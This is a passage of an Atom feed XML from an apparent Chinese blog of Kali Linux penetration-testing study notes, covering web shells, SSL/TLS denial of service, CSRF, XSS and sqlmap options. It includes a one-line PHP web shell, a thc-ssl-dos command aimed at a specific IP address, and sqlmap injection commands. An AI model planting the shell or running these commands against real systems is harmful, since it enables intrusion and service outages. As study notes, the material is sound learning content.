-    
-    
-      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>WebShell</title>
-    <link href="http://yoursite.com/2020/11/06/WebShell/"/>
-    <id>http://yoursite.com/2020/11/06/WebShell/</id>
-    <published>2020-11-06T03:11:01.000Z</published>
-    <updated>2020-11-28T03:12:14.033Z</updated>
-    
-    <summary type="html">
-    
-      &lt;ul&gt;
-&lt;li&gt;&amp;lt;?php echo shell_exec($_GET[‘cmd’]);?&amp;gt;&lt;/li&gt;
-&lt;li&gt;中国菜刀：&lt;a href=&quot;http://www.maicaidao.co&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.maicaidao.co&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;可能被IDS、AV、WAF、扫描器软件发现查杀&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Web渗透-SSL/TLS拒绝服务、Ajax、WebService</title>
-    <link href="http://yoursite.com/2020/11/05/Web%E6%B8%97%E9%80%8F-SSL-TLS%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E3%80%81Ajax%E3%80%81WebService/"/>
-    <id>http://yoursite.com/2020/11/05/Web%E6%B8%97%E9%80%8F-SSL-TLS%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E3%80%81Ajax%E3%80%81WebService/</id>
-    <published>2020-11-05T04:06:05.000Z</published>
-    <updated>2020-11-05T04:06:26.667Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;SSL-TLS拒绝服务攻击&quot;&gt;&lt;a href=&quot;#SSL-TLS拒绝服务攻击&quot; class=&quot;headerlink&quot; title=&quot;SSL/TLS拒绝服务攻击&quot;&gt;&lt;/a&gt;SSL/TLS拒绝服务攻击&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;thc-ssl-dos&lt;ul&gt;
-&lt;li&gt;ssl协商加密对性能开销大，大量握手请求会导致拒绝服务&lt;/li&gt;
-&lt;li&gt;利用SSL secure Renegotiation特性，在单一TCP连接中生成数千个SSL重连接请求，造成服务器资源过载&lt;/li&gt;
-&lt;li&gt;与流量式拒绝服务攻击不同，thc-ssl-dos可以利用dsl线路打垮30G带宽的服务器&lt;/li&gt;
-&lt;li&gt;服务器平均可以处理300次/秒SSL握手请求&lt;/li&gt;
-&lt;li&gt;对SMTPS、POP3S、等服务同样有效&lt;/li&gt;
-&lt;li&gt;thc-ssl-dos 199.223.209.205 2804 -accept&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>跨站请求伪造CSRF</title>
-    <link href="http://yoursite.com/2020/10/27/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0CSRF/"/>
-    <id>http://yoursite.com/2020/10/27/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0CSRF/</id>
-    <published>2020-10-27T15:40:04.000Z</published>
-    <updated>2020-10-28T16:17:50.871Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;CSRF（Cross-site-request-forgery）&quot;&gt;&lt;a href=&quot;#CSRF（Cross-site-request-forgery）&quot; class=&quot;headerlink&quot; title=&quot;CSRF（Cross-site request forgery）&quot;&gt;&lt;/a&gt;CSRF（Cross-site request forgery）&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;从信任的角度来区分&lt;ul&gt;
-&lt;li&gt;XSS：利用用户对站点的信任&lt;/li&gt;
-&lt;li&gt;CSRF：利用站点对已经身份认证的信任&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>跨站脚本攻击XSS</title>
-    <link href="http://yoursite.com/2020/10/26/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/"/>
-    <id>http://yoursite.com/2020/10/26/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/</id>
-    <published>2020-10-26T05:26:30.000Z</published>
-    <updated>2020-10-28T16:17:36.563Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;XSS&quot;&gt;&lt;a href=&quot;#XSS&quot; class=&quot;headerlink&quot; title=&quot;XSS&quot;&gt;&lt;/a&gt;XSS&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;攻击web客户端&lt;/li&gt;
-&lt;li&gt;客户端脚本语言&lt;ul&gt;
-&lt;li&gt;弹窗告警、广告&lt;/li&gt;
-&lt;li&gt;Javascript&lt;/li&gt;
-&lt;li&gt;在浏览器中执行&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;XSS（cross-site scripting）&lt;ul&gt;
-&lt;li&gt;通过web站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击目的&lt;/li&gt;
-&lt;li&gt;注入客户端脚本代码&lt;/li&gt;
-&lt;li&gt;盗取cookie&lt;/li&gt;
-&lt;li&gt;重定向&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SQLMap自动注入-General等其余参数</title>
-    <link href="http://yoursite.com/2020/10/22/SQLMap%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5-General%E7%AD%89%E5%85%B6%E4%BD%99%E5%8F%82%E6%95%B0/"/>
-    <id>http://yoursite.com/2020/10/22/SQLMap%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5-General%E7%AD%89%E5%85%B6%E4%BD%99%E5%8F%82%E6%95%B0/</id>
-    <published>2020-10-22T00:43:42.000Z</published>
-    <updated>2020-11-05T00:44:34.253Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;SQLMap自动注入-Injection&quot;&gt;&lt;a href=&quot;#SQLMap自动注入-Injection&quot; class=&quot;headerlink&quot; title=&quot;SQLMap自动注入-Injection&quot;&gt;&lt;/a&gt;SQLMap自动注入-Injection&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;-p&lt;ul&gt;
-&lt;li&gt;指定扫描的参数，使–level失效&lt;/li&gt;
-&lt;li&gt;-p “user-agent,referer”&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;–skip&lt;ul&gt;
-&lt;li&gt;排除指定的扫描参数&lt;/li&gt;
-&lt;li&gt;–level=5 –skip=”id,user-agent”&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SQLMap自动注入-Request、Optimization</title>
-    <link href="http://yoursite.com/2020/10/21/SQLMap%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5-Request%E3%80%81Optimization/"/>
-    <id>http://yoursite.com/2020/10/21/SQLMap%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5-Request%E3%80%81Optimization/</id>
-    <published>2020-10-21T09:58:32.000Z</published>
-    <updated>2020-10-21T09:58:58.472Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;SQLMap自动注入-Request&quot;&gt;&lt;a href=&quot;#SQLMap自动注入-Request&quot; class=&quot;headerlink&quot; title=&quot;SQLMap自动注入-Request&quot;&gt;&lt;/a&gt;SQLMap自动注入-Request&lt;/h3&gt;&lt;h5 id=&quot;基本数据&quot;&gt;&lt;a href=&quot;#基本数据&quot; class=&quot;headerlink&quot; title=&quot;基本数据&quot;&gt;&lt;/a&gt;基本数据&lt;/h5&gt;&lt;ul&gt;
-&lt;li&gt;数据段： –data&lt;ul&gt;
-&lt;li&gt;get/post都使用&lt;/li&gt;
-&lt;li&gt;sqlmap -u “&lt;a href=&quot;http://1.1.1.1/a.php”&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://1.1.1.1/a.php”&lt;/a&gt; –data=”user=1&amp;amp;pass=2”-f&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;变量分隔符：–param-del&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;http://1.1.1.1/a.php?q=foo;id=1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://1.1.1.1/a.php?q=foo;id=1&lt;/a&gt;    //用；替换&amp;amp;&lt;/li&gt;
-&lt;li&gt;sqlmap -u “&lt;a href=&quot;http://1.1.1.1/a.php&amp;quot;&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://1.1.1.1/a.php&amp;quot;&lt;/a&gt; –data=”q=foo;id=1” –param-del=”;” -f&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SQLMap自动注入-Target</title>
-    <link href="http://yoursite.com/2020/10/20/SQLMap%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5-Target/"/>
-    <id>http://yoursite.com/2020/10/20/SQLMap%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5-Target/</id>
-    <published>2020-10-20T08:01:59.000Z</published>
-    <updated>2020-10-20T08:02:15.498Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;SQLMap自动注入&quot;&gt;&lt;a href=&quot;#SQLMap自动注入&quot; class=&quot;headerlink&quot; title=&quot;SQLMap自动注入&quot;&gt;&lt;/a&gt;SQLMap自动注入&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;开源sql注入漏洞检测、利用工具&lt;/li&gt;
-&lt;li&gt;检测动态页面中get/post参数、cookie、http头&lt;/li&gt;
-&lt;li&gt;数据榨取&lt;/li&gt;
-&lt;li&gt;文件系统访问&lt;/li&gt;
-&lt;li&gt;操作系统命令执行&lt;/li&gt;
-&lt;li&gt;引擎强大、特性丰富&lt;/li&gt;
-&lt;li&gt;Xss漏洞检测&lt;/li&gt;
 &lt;/ul&gt;
     
     </summary>
